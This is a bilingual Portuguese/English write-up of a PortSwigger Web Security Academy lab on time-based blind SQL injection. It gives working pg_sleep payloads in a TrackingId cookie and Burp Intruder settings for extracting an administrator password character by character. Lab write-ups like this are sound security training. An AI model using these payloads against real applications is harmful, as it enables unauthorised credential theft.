# Lab 15 — Blind SQL Injection with Time Delays and Information Retrieval

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — Blind / Time-Based  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-07

### Descrição

Evolução do lab anterior: agora o canal de tempo é usado para extrair a senha do `administrator` caractere por caractere. Nenhuma variação de conteúdo ou erro é visível — apenas o tempo de resposta como oráculo.

### Conceito

A técnica combina inferência booleana com delay condicional: se a condição testada for verdadeira, o banco executa `pg_sleep(10)` e a resposta demora; se falsa, responde imediatamente. Isso permite testar cada caractere da senha com o mesmo método do lab de conditional responses, mas usando tempo como canal.

### Reconhecimento

**Confirmando o canal booleano via tempo:**

```
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
→ 10 segundos de delay (condição verdadeira)

```
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
→ Resposta imediata (condição falsa)

Canal confirmado.

**Confirmando usuário `administrator`:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
→ 10 segundos — usuário existe.

### Exploração

**Descobrindo o tamanho da senha:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Incrementando até a resposta parar de demorar — senha tem **20 caracteres**.

**Extraindo cada caractere com Burp Intruder:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Configurar o Intruder com **1 thread simultânea** (Resource Pool → Max concurrent requests: 1) para medir o tempo com precisão. A coluna "Response received" mostra o tempo em ms — o payload com ~10.000ms é o caractere correto.

### O que aprendi

- Time-based blind SQLi é mais lento e menos confiável que boolean-based — uma thread simultânea é obrigatória para resultados consistentes
- O `CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(0)` é a estrutura central do ataque
- A coluna "Response received" no Intruder é o equivalente temporal do Grep Match dos labs anteriores
- Em condições de rede instável, delays podem ser imprecisos — considerar margem de tolerância

### Referências

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Blind / Time-Based  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-07

### Description

Evolution of the previous lab: now the time channel is used to extract the `administrator` password character by character. No content variation or visible errors — only response time as an oracle.

### Concept

The technique combines boolean inference with conditional delay: if the tested condition is true, the database executes `pg_sleep(10)` and the response is delayed; if false, it responds immediately. This allows testing each password character using the same method as the conditional responses lab, but using time as the channel.

### Reconnaissance

**Confirming the boolean channel via time:**

```
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
→ 10-second delay (true condition)

```
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
→ Immediate response (false condition)

Channel confirmed.

**Confirming `administrator` user:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
→ 10 seconds — user exists.

### Exploitation

**Finding the password length:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Incrementing until the response stops delaying — password is **20 characters** long.

**Extracting each character with Burp Intruder:**

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Configure Intruder with **1 concurrent thread** (Resource Pool → Max concurrent requests: 1) to measure time accurately. The "Response received" column shows time in ms — the payload with ~10,000ms is the correct character.

### What I learned

- Time-based blind SQLi is slower and less reliable than boolean-based — a single concurrent thread is mandatory for consistent results
- `CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(0)` is the attack's central structure
- The "Response received" column in Intruder is the temporal equivalent of Grep Match from previous labs
- In unstable network conditions, delays can be imprecise — consider a tolerance margin

### References

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
